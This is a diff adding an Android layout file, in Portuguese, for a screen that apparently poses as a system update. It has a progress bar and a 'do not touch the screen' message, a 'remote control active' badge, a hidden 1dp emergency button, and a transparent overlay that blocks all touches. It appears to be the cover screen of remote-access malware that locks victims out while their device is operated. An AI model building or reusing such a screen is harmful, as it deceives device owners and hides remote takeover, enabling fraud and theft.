@@ -1,0 +1,131 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@android:color/black"
+    android:orientation="vertical"
+    android:gravity="center"
+    android:keepScreenOn="true">
+
+    <!-- Fundo com gradiente -->
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:background="@drawable/lock_background"
+        android:orientation="vertical"
+        android:gravity="center">
+
+        <!-- Logo Android -->
+        <ImageView
+            android:id="@+id/android_logo"
+            android:layout_width="120dp"
+            android:layout_height="120dp"
+            android:layout_marginBottom="32dp"
+            android:src="@android:drawable/ic_menu_gallery"
+            android:contentDescription="Android Logo" />
+
+        <!-- Título -->
+        <TextView
+            android:id="@+id/title_text"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Atualizando o sistema Android"
+            android:textColor="@android:color/white"
+            android:textSize="24sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="16dp"
+            android:shadowColor="@android:color/black"
+            android:shadowDx="2"
+            android:shadowDy="2"
+            android:shadowRadius="4" />
+
+        <!-- Barra de progresso -->
+        <ProgressBar
+            android:id="@+id/progress_bar"
+            style="@android:style/Widget.ProgressBar.Horizontal"
+            android:layout_width="300dp"
+            android:layout_height="8dp"
+            android:layout_marginBottom="16dp"
+            android:progress="0"
+            android:max="100"
+            android:progressBackgroundTint="@android:color/darker_gray"
+            android:progressTint="@android:color/holo_blue_light" />
+
+        <!-- Texto de progresso -->
+        <TextView
+            android:id="@+id/progress_text"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Preparando atualização... 0%"
+            android:textColor="@android:color/white"
+            android:textSize="16sp"
+            android:layout_marginBottom="24dp"
+            android:shadowColor="@android:color/black"
+            android:shadowDx="1"
+            android:shadowDy="1"
+            android:shadowRadius="2" />
+
+        <!-- Status atual -->
+        <TextView
+            android:id="@+id/status_text"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Não toque na tela durante a atualização"
+            android:textColor="@android:color/white"
+            android:textSize="14sp"
+            android:alpha="0.8"
+            android:layout_marginBottom="16dp"
+            android:shadowColor="@android:color/black"
+            android:shadowDx="1"
+            android:shadowDy="1"
+            android:shadowRadius="2" />
+
+        <!-- Indicador de controle remoto -->
+        <LinearLayout
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:layout_marginTop="32dp"
+            android:background="@drawable/remote_control_indicator"
+            android:padding="12dp"
+            android:gravity="center">
+
+            <ImageView
+                android:layout_width="24dp"
+                android:layout_height="24dp"
+                android:src="@android:drawable/ic_menu_compass"
+                android:contentDescription="Remote Control" />
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Controle Remoto Ativo"
+                android:textColor="@android:color/white"
+                android:textSize="12sp"
+                android:layout_marginStart="8dp"
+                android:textStyle="bold" />
+
+        </LinearLayout>
+
+        <!-- Botão de emergência (invisível para usuário normal) -->
+        <Button
+            android:id="@+id/emergency_button"
+            android:layout_width="1dp"
+            android:layout_height="1dp"
+            android:layout_marginTop="100dp"
+            android:background="@android:color/transparent"
+            android:text=""
+            android:visibility="invisible" />
+
+    </LinearLayout>
+
+    <!-- Overlay invisível que bloqueia toques -->
+    <View
+        android:id="@+id/touch_blocker"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:background="@android:color/transparent"
+        android:clickable="true"
+        android:focusable="true" />
+
+</RelativeLayout>
